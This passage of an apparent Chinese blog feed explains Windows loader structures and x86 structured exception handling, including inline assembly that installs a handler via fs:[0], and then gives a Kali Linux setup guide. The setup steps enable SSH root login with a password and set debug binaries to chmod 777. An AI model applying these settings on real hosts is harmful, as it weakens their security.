class="comment">// +0x1c</span></span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; <span class="comment">// +0x24</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">　ULONG Length; <span class="comment">// +0x00</span></span><br><span class="line">　BOOLEAN Initialized; <span class="comment">// +0x04</span></span><br><span class="line">　PVOID SsHandle; <span class="comment">// +0x08内存对齐</span></span><br><span class="line">　LIST_ENTRY InLoadOrderModuleList; <span class="comment">// +0x10</span></span><br><span class="line">　LIST_ENTRY InMemoryOrderModuleList; <span class="comment">// +0x20</span></span><br><span class="line">　LIST_ENTRY InInitializationOrderModuleList;<span class="comment">// +0x30</span></span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; <span class="comment">// +0x40</span></span><br></pre></td></tr></table></figure><p>其中LIST_ENTRY是双向链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure><p>而每一个节点都是这样的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    UNICODE_STRING BaseDllName;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    WORD LoadCount;</span><br><span class="line">    WORD TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125; s1;</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONG TimeDateStamp;</span><br><span class="line">        PVOID LoadedImports;</span><br><span class="line">    &#125; DUMMYUNIONNAME2;</span><br><span class="line">    _ACTIVATION_CONTEXT *EntryPointActivationContext;</span><br><span class="line">    PVOID PatchInformation;</span><br><span class="line">    LIST_ENTRY ForwarderLinks;</span><br><span class="line">    LIST_ENTRY ServiceTagLinks;</span><br><span class="line">    LIST_ENTRY StaticLinks;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>InLoadOrderModuleList，InMemoryOrderModuleList，InInitializationOrderModuleList的每个元素都指向的是上一个/下一个节点的对应元素<br>比如InLoadOrderModuleList的Flink和Blink就是指向LDR_DATA_TABLE_ENTRY结构的低一个元素InLoadOrderLinks的地址，也就是LDR_DATA_TABLE_ENTRY的地址，通过这种方法，可以用三种顺序串起加载的模块，同时链接所有的模块结构。</p><h2 id="SEH">SEH</h2><p>下面都是x86的实现</p><h3 id="正向实现">正向实现</h3><p>在VS中，C语言可以直接使用关键字实现Windows结构化异常处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_try</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//可能触发异常的代码</span></span><br><span class="line">&#125;</span><br><span class="line">_except(<span class="comment">/*过滤表达式*/</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//异常处理</span></span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>过滤表达式的取值如下：</p><ol><li><code>EXCEPTION_EXECUTE_HANDLER</code> (1) 执行<code>except</code>里面的代码</li><li><code>EXCEPTION_CONTINUE_SEARCH</code> (0) 寻找下一个异常处理函数</li><li><code>EXCEPTION_CONTINUE_EXECUTION</code> (-1) 返回出错位置重新执行</li></ol><p>举例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">modify_ecx</span><span class="params">(EXCEPTION_POINTERS* pExceptionInfo)</span> &#123;</span><br><span class="line">pExceptionInfo-&gt;ContextRecord-&gt;Ecx = <span class="number">1</span>; <span class="comment">// 修改ECX寄存器的值为1</span></span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>);</span><br><span class="line"><span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">__try &#123;</span><br><span class="line">a++;</span><br><span class="line">b--;</span><br><span class="line"><span class="type">int</span> c = a / b; <span class="comment">// 这里会产生除零异常</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;c = %d\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line">__except (b = <span class="number">9</span>, modify_ecx(GetExceptionInformation())) &#123;</span><br><span class="line"><span class="keyword">if</span> (b == <span class="number">9</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;异常处理：已更改除数&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;异常处理&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个程序，在except中修改b的值，然后返回原处继续执行，以跳过bug</p><p>还有一个不常用的语法<code>__finally&#123;&#125;</code>，效果是无论有没有异常处理，只要try块全部处理结束就会转到finally块中执行操作</p><p>在汇编中实现，需要先知道SEH的结构，所以先看后面的吧</p><h3 id="异常分类">异常分类</h3><p>上面的例子中使用的是除零异常，还有下面几种常见异常</p><ul><li>EXCEPTION_ACCESS_VIOLATION     0xC0000005     程序企图读写一个不可访问的地址时引发的异常。例如企图读取0地址处的内存。</li><li>EXCEPTION_ARRAY_BOUNDS_EXCEEDED    0xC000008C     数组访问越界时引发的异常。</li><li>EXCEPTION_BREAKPOINT                           0x80000003     触发断点时引发的异常。</li><li>EXCEPTION_DATATYPE_MISALIGNMENT    0x80000002     程序读取一个未经对齐的数据时引发的异常。</li><li>EXCEPTION_FLT_DENORMAL_OPERAND     0xC000008D     如果浮点数操作的操作数是非正常的，则引发该异常。所谓非正常，即它的值太小以至于不能用标准格式表示出来。</li><li>EXCEPTION_FLT_DIVIDE_BY_ZERO                   0xC000008E     浮点数除法的除数是0时引发该异常。</li><li>EXCEPTION_FLT_INEXACT_RESULT           0xC000008F     浮点数操作的结果不能精确表示成小数时引发该异常。</li><li>EXCEPTION_FLT_INVALID_OPERATION            0xC0000090     该异常表示不包括在这个表内的其它浮点数异常。</li><li>EXCEPTION_FLT_OVERFLOW                             0xC0000091     浮点数的指数超过所能表示的最大值时引发该异常。</li><li>EXCEPTION_FLT_STACK_CHECK                  0xC0000092     进行浮点数运算时栈发生溢出或下溢时引发该异常。</li><li>EXCEPTION_FLT_UNDERFLOW                    0xC0000093     浮点数的指数小于所能表示的最小值时引发该异常。</li><li>EXCEPTION_ILLEGAL_INSTRUCTION          0xC000001D     程序企图执行一个无效的指令时引发该异常。</li><li>EXCEPTION_IN_PAGE_ERROR                        0xC0000006     程序要访问的内存页不在物理内存中时引发的异常。</li><li>EXCEPTION_INT_DIVIDE_BY_ZERO                   0xC0000094     整数除法的除数是0时引发该异常。</li><li>EXCEPTION_INT_OVERFLOW                             0xC0000095     整数操作的结果溢出时引发该异常。</li><li>EXCEPTION_INVALID_DISPOSITION                  0xC0000026     异常处理器返回一个无效的处理的时引发该异常。</li><li>EXCEPTION_NONCONTINUABLE_EXCEPTION     0xC0000025     发生一个不可继续执行的异常时，如果程序继续执行，则会引发该异常。</li><li>EXCEPTION_PRIV_INSTRUCTION                     0xC0000096     程序企图执行一条当前CPU模式不允许的指令时引发该异常。</li><li>EXCEPTION_SINGLE_STEP                          0x80000004     标志寄存器的TF位为1时，每执行一条指令就会引发该异常。主要用于单步调试。</li><li>EXCEPTION_STACK_OVERFLOW                   0xC00000FD     栈溢出时引发该异常。</li></ul><h3 id="异常处理流程">异常处理流程</h3><p>当触发了一个异常，会根据优先级来分配谁来处理这个异常，如果是程序本身，系统就会查看线程的fs:[0]有没有安装SEH，如果有就会调用这里的函数。</p><p>fs:[0]即NT_TIB</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB32</span> &#123;</span></span><br><span class="line">    DWORD ExceptionList;</span><br><span class="line">    DWORD StackBase;</span><br><span class="line">    DWORD StackLimit;</span><br><span class="line">    DWORD SubSystemTib;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_MSC_EXTENSIONS)</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    DWORD FiberData;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    DWORD ArbitraryUserPointer;</span><br><span class="line">    DWORD Self;</span><br><span class="line">&#125; NT_TIB32, *PNT_TIB32;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB64</span> &#123;</span></span><br><span class="line">    DWORD64 ExceptionList;</span><br><span class="line">    DWORD64 StackBase;</span><br><span class="line">    DWORD64 StackLimit;</span><br><span class="line">    DWORD64 SubSystemTib;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_MSC_EXTENSIONS)</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD64 FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    DWORD64 FiberData;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    DWORD64 ArbitraryUserPointer;</span><br><span class="line">    DWORD64 Self;</span><br><span class="line">&#125; NT_TIB64, *PNT_TIB64;</span><br></pre></td></tr></table></figure><p>的第一个元素是指向EXCEPTION_REGISTRATION_RECORD类型的指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;</span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><p>可以看出，这是一个链表，其中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span></span><br><span class="line">_IRQL_requires_same_</span><br><span class="line">_Function_class_(EXCEPTION_ROUTINE)</span><br><span class="line">EXCEPTION_DISPOSITION</span><br><span class="line">NTAPI</span><br><span class="line"><span class="title function_">EXCEPTION_ROUTINE</span> <span class="params">(</span></span><br><span class="line"><span class="params">    _Inout_ <span class="keyword">struct</span> _EXCEPTION_RECORD *ExceptionRecord,</span></span><br><span class="line"><span class="params">    _In_ PVOID EstablisherFrame,</span></span><br><span class="line"><span class="params">    _Inout_ <span class="keyword">struct</span> _CONTEXT *ContextRecord,</span></span><br><span class="line"><span class="params">    _In_ PVOID DispatcherContext</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> EXCEPTION_ROUTINE *PEXCEPTION_ROUTINE;</span><br></pre></td></tr></table></figure><p>PEXCEPTION_ROUTINE是一个函数指针，其中第一个传参详细描述了异常。ContextRecord保留CPU处理异常前的状态</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></span><br><span class="line">    DWORD ExceptionCode;</span><br><span class="line">    DWORD ExceptionFlags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span></span><br><span class="line">    PVOID ExceptionAddress;<span class="comment">//发生异常的地址</span></span><br><span class="line">    DWORD NumberParameters;</span><br><span class="line">    ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br><span class="line"><span class="keyword">typedef</span> EXCEPTION_RECORD *PEXCEPTION_RECORD;</span><br></pre></td></tr></table></figure><p>Windows会依次访问Handler，如果函数不处理，返回ExceptionContinueSearch，那么就会向后查Next，直到找到能处理的。</p><h3 id="汇编实现">汇编实现</h3><p>那么，想要实现上面的操作就是给系统注册一个回调函数来调用就好了，即：手动实现EXCEPTION_REGISTRATION_RECORD然后挂到链上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> c = a / b;</span><br><span class="line">&#125;</span><br><span class="line">__except (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;divide 0!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">EXCEPTION_DISPOSITION <span class="title function_">myExceptionHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">_Inout_ <span class="keyword">struct</span> _EXCEPTION_RECORD* ExceptionRecord,</span></span><br><span class="line"><span class="params">_In_ PVOID EstablisherFrame,</span></span><br><span class="line"><span class="params">_Inout_ <span class="keyword">struct</span> _CONTEXT* ContextRecord,</span></span><br><span class="line"><span class="params">_In_ PVOID DispatcherContext)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;divide 0!\n&quot;</span>);</span><br><span class="line">ContextRecord-&gt;Eip += <span class="number">3</span>;</span><br><span class="line"><span class="keyword">return</span> ExceptionContinueExecution;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ExceptionContinueSearch;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">DWORD tmp = <span class="number">0</span>;</span><br><span class="line">__asm &#123;<span class="comment">//安装SEH,push需要倒置</span></span><br><span class="line">push myExceptionHandler;<span class="comment">//自己异常处理函数</span></span><br><span class="line">push dword ptr fs : [<span class="number">0</span>] ;<span class="comment">//next</span></span><br><span class="line">mov dword ptr fs : [<span class="number">0</span>] , esp;<span class="comment">//设置新的链首</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> c = a / b;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hihi&quot;</span>);</span><br><span class="line">__asm &#123;<span class="comment">//卸载SEH</span></span><br><span class="line">mov dword ptr fs : [<span class="number">0</span>] , esp;</span><br><span class="line">pop eax;</span><br><span class="line">pop eax;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SEH只能在栈上使用，而VEH可以在堆上使用</p><h3 id="unwind">unwind</h3><p>在try块结束后会依次删除seh链，并释放资源</p><p>x64下，seh不由seh链实现，而是由seh表实现</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> 反动态调试 </category>
          
          <category> 异常处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> windows </tag>
            
            <tag> 内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali配置步骤</title>
      <link href="/posts/8e948a96.html"/>
      <url>/posts/8e948a96.html</url>
      
        <content type="html"><![CDATA[<p>今天不小心把kali删了，于是准备重新装一个，之前装的时候也没有怎么仔细用过，权当是用来调试elf，所以趁放假重新配一个，顺便记录一下流程。</p><hr><h2 id="安装kali-linux">安装kali-linux</h2><p>下载vmware</p><p><a href="https://www.vmware.com/">VMware - Delivering a Digital Foundation For Businesses</a></p><p>下载kali</p><p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">Get Kali | Kali Linux</a></p><p><img src="https://s2.loli.net/2024/05/02/LxIoaKvrtRCSXpf.png" alt="image-20240502133052716"></p><p>建议图里面框着的这个</p><p><a href="https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-vmware-amd64.7z">下载直链</a></p><hr><p>下载完成后解压并打开文件夹，如果已经安装好了VMware，那么双击vmx文件会自动弹出VMware并配置好虚拟机。现在就可以用了。</p><p>点击开启。</p><p>账户和密码均为kali</p><p>现在就可以使用了。</p><hr><h2 id="基本设置">基本设置</h2><h3 id="设置中文">设置中文</h3><p>输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p>在对应选框按空格选择对应语言包然后按回车确认</p><p><img src="https://s2.loli.net/2024/05/02/hnwkv8z2C7GdFir.png" alt="image-20240502140958050"></p><p>后一个页面在zh_CN.UTF-8的位置回车</p><p>重启后生效。</p><h3 id="更新软件包">更新软件包</h3><p>使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><p>来更新软件包</p><h3 id="换源">换源</h3><p>安装leafpad</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install leafpad</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo leafpad /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>添加源：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#中科大</span></span><br><span class="line">deb http:<span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#阿里云</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#清华大学</span></span><br><span class="line">deb http:<span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br></pre></td></tr></table></figure><h3 id="获取vscode-其实用vim也可以">获取vscode/其实用vim也可以</h3><p>打开火狐，直接搜索官网</p><p>下载deb版本</p><p>在download文件夹使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i ./(文件名)</span><br></pre></td></tr></table></figure><h3 id="改变字体">改变字体</h3><p>下载好自己想要的字体，我的字体是内置的</p><p>在终端-文件-参数配置-第一行修改字体和大小</p><h3 id="配置ssh">配置ssh</h3><p>编辑config</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo leafpad /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>#PasswordAuthentication yes行去掉#</p><p>#PermitRootLogin prohibit-password去掉#</p><p>把prohibit-password改为yes</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service ssh start</span><br><span class="line">sudo service ssh status</span><br></pre></td></tr></table></figure><p>此时如果有：</p><p><code>active(running)</code>就算成功</p><h2 id="基本环境配置">基本环境配置</h2><p>由于不懂web，所以只配了其它环境</p><h3 id="RE环境配置">RE环境配置</h3><p>创建一个文件夹，放入ida的调试文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 linux_server</span><br><span class="line">chmod 777 linux_server64</span><br></pre></td></tr></table></figure><p>修改权限</p><p>使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p>查看ip端口号</p><p><img src="https://s2.loli.net/2024/05/02/Jsgn1Mho3uKSp6w.png" alt="image-20240502155336325"></p><p>先执行对应的server(如果你的文件是32位的就不加64)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux_server64</span><br></pre></td></tr></table></figure><p>然后在ida中输入</p><p><img src="https://s2.loli.net/2024/05/02/TNQqLdpEAug6Vaf.png" alt="image-20240502155358135"></p><p>调试成功</p><h3 id="CRY环境配置">CRY环境配置</h3><h4 id="安装docker">安装docker</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker docker-compose </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">或</span></span><br><span class="line">apt-get install docker.io</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动docker服务</span></span><br><span class="line">service docker start</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">列出docker现有镜像</span></span><br><span class="line">docker images</span><br><span class="line"> </span><br><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p>如果弹出</p><p><img 